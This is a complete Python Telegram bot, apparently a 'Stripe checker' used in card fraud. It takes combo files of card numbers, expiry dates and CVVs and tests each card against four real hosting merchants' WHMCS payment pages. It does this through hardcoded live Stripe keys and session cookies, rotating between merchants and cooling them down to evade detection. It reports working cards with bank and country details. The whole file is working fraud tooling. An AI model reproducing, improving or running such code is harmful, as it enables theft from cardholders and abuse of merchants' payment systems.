#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import re
import time
import requests
import uuid
import threading
import hashlib
import random
from datetime import datetime
from telebot import TeleBot, types

# =============== توكن بوت التفاعل ===============
BOT_TOKEN = os.getenv("BOT_TOKEN")

# =============== الأدمن والمطور ===============
ADMINS = [8855682617]
DEV = "@z_0_y2"
AUTHOR = "@z_0_y2"
VERSION = "v3.5 - Per-Gateway 10-Card Counter"

# =============== نظام المستخدمين والكودات ===============
AUTHORIZED_USERS = [6813661794, 1970257616]
user_codes = {}
pending_codes = {}

# بطاقة الفحص المساعدة (تُضبط عبر /cc)
GLOBAL_TEST_CARD = None

# =============== البوابات الأربعة ===============
GATEWAYS = [
    {
        "id": 1,
        "name": "Stripe Auth #1",
        "stripe_key": "pk_live_51Ps3vERuauo2vgoqgy8ao06fnaQeTZ4yQhwXSMKOWXi4Mt30MX7ngj2nGM4IefvYP66TEgcm6A97yUXMDIRpBxN4009kt1eFst",
        "url": "https://my.reliabecloud.com",
        "cookies": {
            '__stripe_mid': '5606e7f7-ffad-4a87-afff-7c4bbefa1288e4fcb4',
            '__stripe_sid': '9be0b0e8-66a2-47fb-b1b9-e15b002bed59cc8101',
            'WHMCSPKhB4ecIIbla': '7e05fba0b7e930c906ce8cdb6eb060da',
        },
        "active": True,
        "processed_count": 0,  # عداد خاص بهذه البوابة فقط
        "cooldown_until": 0
    },
    {
        "id": 2,
        "name": "Stripe Auth #2",
        "stripe_key": "pk_live_51PElYwIFXufYIZycRp4YJLtrPXgfPDQ3CIhexgD9ZshcwFFb37t0j5eiTHucHF9MK5x6R98OB33A9if2uVgazNLO00m6NHeph5",
        "url": "https://www.fastpanda.co.uk",
        "cookies": {
            '_currency': 'GBP',
            '__stripe_mid': 'c80e6842-8e7f-4094-bf69-b0bfad479dc3371465',
            '__stripe_sid': 'c48426b9-1b57-471a-99ea-41b61b1faf0634009f',
            'WHMCSy551iLvnhYt7': 'jfdibhghp5lknhqvg1matrrhd7',
            'WHMCSUser': '6125%3A%3A7da785e673fb9cd6a96ee730b1d3e9fc5ee1a853',
        },
        "active": True,
        "processed_count": 0,  # عداد خاص بهذه البوابة فقط
        "cooldown_until": 0
    },
    {
        "id": 3,
        "name": "Stripe Auth #3",
        "stripe_key": "pk_live_51NxTgeFZsEVAL3ZKnbjGrz8S0xO6fhPvT4bt4aeooxVpo5Scvr9sBQQ24ROaDcQGBavclQgqnrNPJOuqY4rlW5ji000xb2zNt3",
        "url": "https://dashboard.proxywing.com",
        "cookies": {
            '__stripe_mid': '00c7238d-a235-4f5a-81a2-88c5ee79ddb7abcb25',
            '__stripe_sid': '8380ecbd-126c-4f1f-a242-879f55bd453c5eead6',
            'WHMCSfJ1XkWUErbVN': '9ur34qe7208kf4q92esim7dvk5',
        },
        "active": True,
        "processed_count": 0,  # عداد خاص بهذه البوابة فقط
        "cooldown_until": 0
    },
    {
        "id": 4,
        "name": "Stripe Auth #4",
        "stripe_key": "pk_live_CyAsnsy8MCNVuWWHRCOmtmSb",
        "url": "https://www.bacloud.com",
        "cookies": {
            '__stripe_mid': '2150425d-64a2-4a0b-88d5-2878c850bd4e3336ea',
            '__stripe_sid': '6a0b2496-4c3c-4aa4-8a14-b6bbaa31790ea0cf3c',
            'WHMCS6gnIyj0tBZJA': 'or7eg2ni1n5mrdlrjpabqo31ol',
        },
        "active": True,
        "processed_count": 0,  # عداد خاص بهذه البوابة فقط
        "cooldown_until": 0
    }
]

bot = TeleBot(BOT_TOKEN, parse_mode='HTML')

# =============== دوال نظام الكودات ===============
def is_authorized(user_id):
    if user_id in ADMINS:
        return True
    if user_id in user_codes:
        if user_codes[user_id]['expiry'] > time.time():
            return True
        else:
            del user_codes[user_id]
    return False

# =============== إنشاء SetupIntent ===============
def create_fresh_setup_intent(gateway):
    try:
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9', 
                   'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
        
        if "reliabecloud" in gateway['url']:
            url = f"{gateway['url']}/index.php?rp=/account/paymentmethods/add"
        elif "fastpanda" in gateway['url']:
            url = f"{gateway['url']}/index.php/account/paymentmethods/add"
        elif "proxywing" in gateway['url']:
            url = f"{gateway['url']}/billing/account/paymentmethods/add"
        else:
            url = f"{gateway['url']}/index.php?rp=/account/paymentmethods/add"
        
        response = requests.get(url, headers=headers, cookies=gateway["cookies"], timeout=30)
        if response.status_code != 200:
            return None
        
        html = response.text
        token_match = re.search(r'name="token"\s+value="([a-f0-9]+)"', html)
        if not token_match:
            token_match = re.search(r'"token":"([a-f0-9]+)"', html)
        token = token_match.group(1) if token_match else None
        if not token:
            return None
        
        cs_match = re.search(r'client_session_id["\']?\s*[:=]\s*["\']([a-f0-9-]+)["\']', html)
        client_session_id = cs_match.group(1) if cs_match else str(uuid.uuid4())
        
        wc_match = re.search(r'wallet_config_id["\']?\s*[:=]\s*["\']([a-f0-9-]+)["\']', html)
        wallet_config_id = wc_match.group(1) if wc_match else str(uuid.uuid4())
        
        headers2 = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = f'token={token}&type=token_stripe&billingcontact=0'
        
        if "reliabecloud" in gateway['url']:
            url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
        elif "fastpanda" in gateway['url']:
            url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
        elif "proxywing" in gateway['url']:
            url2 = f"{gateway['url']}/billing/index.php?rp=/stripe/setup/intent"
        else:
            url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
        
        response2 = requests.post(url2, headers=headers2, data=data, cookies=gateway["cookies"], timeout=30)
        result = response2.json()
        
        if 'setup_intent' in result:
            full = result['setup_intent']
            return {
                'id': full.split('_secret')[0],
                'secret': full,
                'client_session_id': client_session_id,
                'wallet_config_id': wallet_config_id,
                'stripe_mid': str(uuid.uuid4()),
                'stripe_sid': str(uuid.uuid4()),
            }
        return None
    except Exception:
        return None

# =============== فحص البطاقة ===============
def check_card_with_gateway(card_line, gateway):
    intent_data = create_fresh_setup_intent(gateway)
    if not intent_data:
        return "❌ FAILED TO CREATE INTENT"
    
    try:
        parts = card_line.split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 4:
            yy = yy[-2:]
        
        formatted_cc = ' '.join([cc[i:i+4] for i in range(0, len(cc), 4)])
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        
        data = f'payment_method_data[type]=card&payment_method_data[card][number]={formatted_cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mm.zfill(2)}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=9cf5bb6e-4c21-4b0b-8201-f1038da56c735b2538&payment_method_data[muid]={intent_data["stripe_mid"]}&payment_method_data[sid]={intent_data["stripe_sid"]}&payment_method_data[payment_user_agent]=stripe.js%2F58c31ec645%3B+stripe-js-v3%2F58c31ec645%3B+split-card-element&payment_method_data[referrer]={gateway["url"]}&payment_method_data[time_on_page]=50000&payment_method_data[client_attribution_metadata][client_session_id]={intent_data["client_session_id"]}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=split-card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&payment_method_data[client_attribution_metadata][wallet_config_id]={intent_data["wallet_config_id"]}&expected_payment_method_type=card&use_stripe_sdk=true&key={gateway["stripe_key"]}&client_attribution_metadata[client_session_id]={intent_data["client_session_id"]}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]={intent_data["wallet_config_id"]}&client_secret={intent_data["secret"]}'
        
        url = f'https://api.stripe.com/v1/setup_intents/{intent_data["id"]}/confirm'
        response = requests.post(url, headers=headers, data=data, timeout=8)
        result = response.json()
        
        if result.get('status') == 'succeeded':
            return "✅ APPROVED"
        elif 'error' in result:
            decline_code = result['error'].get('decline_code', '')
            decline_message = result['error'].get('message', '')
            if decline_code:
                return f"❌ DECLINED [{decline_code}]"
            elif decline_message:
                short_msg = decline_message[:40] + "..." if len(decline_message) > 40 else decline_message
                return f"❌ DECLINED [{short_msg}]"
            return "❌ DECLINED"
        return "❌ DECLINED"
        
    except Exception as e:
        return f"❌ ERROR [{str(e)[:20]}]"

def get_bin_info(bin_num):
    try:
        r = requests.get(f'https://lookup.binlist.net/{bin_num}', timeout=5)
        if r.status_code == 200:
            d = r.json()
            return {
                'bank': d.get('bank', {}).get('name', 'Unknown'),
                'country': d.get('country', {}).get('name', 'Unknown'),
                'emoji': d.get('country', {}).get('emoji', '🌍'),
                'scheme': d.get('scheme', 'Unknown'),
                'type': d.get('type', 'Unknown'),
            }
    except Exception:
        pass
    return {'bank': 'Unknown', 'country': 'Unknown', 'emoji': '🌍', 'scheme': 'Unknown', 'type': 'Unknown'}

def extract_cards_from_text(content):
    cards = []
    for line in content.split('\n'):
        line = line.strip()
        if line and '|' in line:
            parts = line.split('|')
            if len(parts) >= 4:
                cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                if len(yy) == 4:
                    yy = yy[-2:]
                cards.append(f"{cc}|{mm}|{yy}|{cvv}")
    return cards

# =============== الأوامر والمعالجة ===============
@bot.message_handler(commands=["cc"])
def set_test_card(message):
    global GLOBAL_TEST_CARD
    user_id = message.chat.id
    if user_id not in ADMINS and not is_authorized(user_id):
        bot.reply_to(message, "❌ ACCESS DENIED")
        return

    card = message.text.replace('/cc', '').strip()
    parts = card.split('|')
    if len(parts) < 4:
        bot.reply_to(message, "❌ <b>صيغة خاطئة!</b>\nإستعمل: <code>/cc CC|MM|YY|CVV</code>", parse_mode='HTML')
        return

    GLOBAL_TEST_CARD = card
    bot.reply_to(message, f"✅ <b>تم ضبط فيزا الاختبار الخاصة بنجاح!</b>\n💳 <code>{card}</code>\nسيتم استخدامها لتجربة كل بوابة بعد أن تفحص 10 بطاقات خاصة بها.", parse_mode='HTML')

@bot.message_handler(commands=["start"])
def start_command(message):
    user_id = message.chat.id
    if is_authorized(user_id) or user_id in ADMINS:
        test_status = f"<code>{GLOBAL_TEST_CARD}</code>" if GLOBAL_TEST_CARD else "غير محددة (إستعمل /cc)"
        bot.reply_to(message, f"""
✅ <b>Stripe Checker Bot</b>
━━━━━━━━━━━━━━━━━━━━━
📌 <b>الأوامر الرئيسية:</b>
/chk CC|MM|YY|CVV - فحص بطاقة واحدة
/cc CC|MM|YY|CVV - تعيين بطاقة فحص صحة البوابات
/combo - ارسل ملف txt لفحص تلقائي
━━━━━━━━━━━━━━━━━━━━━
💳 <b>بطاقة الفحص الحالية:</b> {test_status}
━━━━━━━━━━━━━━━━━━━━━
{VERSION} | {DEV}
""", parse_mode='HTML')
    else:
        bot.reply_to(message, "❌ <b>ACCESS DENIED</b>", parse_mode='HTML')

@bot.message_handler(content_types=["document"])
def handle_combo_file(message):
    user_id = message.chat.id
    if user_id not in ADMINS and not is_authorized(user_id):
        bot.reply_to(message, "❌ ACCESS DENIED")
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode('utf-8')
        
        cards = extract_cards_from_text(content)
        if not cards:
            bot.reply_to(message, "❌ لم يتم العثور على بطاقات صالحة في الملف.")
            return
        
        bot.reply_to(message, f"""
📁 <b>تم استلام الملف بنجاح!</b>
📊 عدد البطاقات الإجمالي: {len(cards)}
🔄 النمط: توزيع دوري (كل بوابة يفحص فيها 10 بطاقات مستقلة ثم يختبرها بالـ /cc)
⚡ <b>جاري بدء الفحص...</b>
""", parse_mode='HTML')
        
        threading.Thread(target=process_auto_rotation_combo, args=(message.chat.id, cards), daemon=True).start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")

def process_auto_rotation_combo(chat_id, cards):
    total = len(cards)
    approved = 0
    declined = 0
    results_list = []
    
    # تصفير عداد البطاقات لكل بوابة بشكل مستقل
    for g in GATEWAYS:
        g['processed_count'] = 0

    status_msg = bot.send_message(chat_id, f"🚀 جاري الفحص بالتداول على البوابات...\n━━━━━━━━━━━━━━━━━━━━━", parse_mode='HTML')
    
    gateway_index = 0

    for i, card in enumerate(cards, 1):
        # البحث عن بوابة جاهزة وليست في فترة راحة
        assigned_gateway = None
        attempts = 0
        
        while attempts < len(GATEWAYS):
            candidate = GATEWAYS[gateway_index % len(GATEWAYS)]
            gateway_index += 1
            attempts += 1
            
            # التأكد أن البوابة لا تخضع لراحة الـ 15 دقيقة
            if time.time() >= candidate.get("cooldown_until", 0):
                assigned_gateway = candidate
                break

        if not assigned_gateway:
            bot.send_message(chat_id, "⚠️ **جميع البوابات في فترة راحة (15 دقيقة)!**\nجاري الانتظار 30 ثانية قبل المحاولة...", parse_mode='HTML')
            time.sleep(30)
            assigned_gateway = GATEWAYS[0]

        # 1. فحص بطاقة من الملف على البوابة المختارة
        result = check_card_with_gateway(card, assigned_gateway)
        
        # زيادة عداد البطاقات المفحوصة لهذه البوابة بالتحديد (+1)
        assigned_gateway['processed_count'] += 1

        if "APPROVED" in result:
            approved += 1
            bin_info = get_bin_info(card.split('|')[0][:6])
            msg = f"""
✅ <b>VALID CARD FOUND!</b>
━━━━━━━━━━━━━━━━━━━━━
💳 <code>{card}</code>
🔐 <b>{assigned_gateway['name']}</b>
📌 {result}
🏦 {bin_info['bank']} | 🌍 {bin_info['emoji']} {bin_info['country']}
⚡ {DEV}
"""
            bot.send_message(chat_id, msg, parse_mode='HTML')
        else:
            declined += 1
            results_list.append(f"💳 <code>{card[:12]}...</code> → {result} [{assigned_gateway['name']}]")

        # 2. فحص هل وصلت هذه البوابة تحديداً إلى 10 بطاقات؟
        if assigned_gateway['processed_count'] >= 10:
            assigned_gateway['processed_count'] = 0  # تصفير عداد هذه البوابة فقط
            
            if GLOBAL_TEST_CARD:
                bot.send_message(chat_id, f"🔍 <b>وصلت البوابة ({assigned_gateway['name']}) إلى 10 بطاقات! جاري فحص بطاقة الـ /cc عليها...</b>", parse_mode='HTML')
                test_res = check_card_with_gateway(GLOBAL_TEST_CARD, assigned_gateway)
                
                if "APPROVED" in test_res:
                    bot.send_message(chat_id, f"✅ <b>اختبار البوابة ({assigned_gateway['name']}) نجح!</b> مستمرة في العمل.", parse_mode='HTML')
                else:
                    assigned_gateway['cooldown_until'] = time.time() + 900  # إراحة البوابة 15 دقيقة (900 ثانية)
                    bot.send_message(chat_id, f"⚠️ <b>البوابة ({assigned_gateway['name']}) فشلت في فحص بطاقة الاختبار!</b>\n⏸️ سيتم إراحة هذه البوابة لمدة 15 دقيقة وتحويل البطاقات إلى باقي البوابات.", parse_mode='HTML')

        # تحديث لوحة النتائج في تلجرام
        if i % 3 == 0 or i == total:
            recent_results = "\n".join(results_list[-5:]) if results_list else "لا يوجد نتائج بعد"
            stats_gateways = "\n".join([f"🔹 {g['name']}: {g['processed_count']}/10" for g in GATEWAYS])
            
            progress_text = f"""
📊 <b>متابعة التقدم الدوري</b>
━━━━━━━━━━━━━━━━━━━━━
📌 الإجمالي: [{i}/{total}] | ✅ {approved} | ❌ {declined}
━━━━━━━━━━━━━━━━━━━━━
<b>عداد البوابات الحالية (حتى الوصول لـ 10):</b>
{stats_gateways}
━━━━━━━━━━━━━━━━━━━━━
<b>آخر البطاقات المفحوصة:</b>
{recent_results}
"""
            try:
                bot.edit_message_text(progress_text, chat_id, status_msg.message_id, parse_mode='HTML')
            except Exception:
                pass
        
        time.sleep(3)

    bot.send_message(chat_id, f"🎉 <b>اكتمل فحص الملف بالكامل!</b>\n✅ المقبولة: {approved}\n❌ المرفوضة: {declined}", parse_mode='HTML')

# =============== تشغيل البوت ===============
if __name__ == "__main__":
    print("🚀 يعمل البوت الآن بالنظام الجديد: عداد 10 بطاقات مستقل لكل بوابة...")
    bot.infinity_polling()

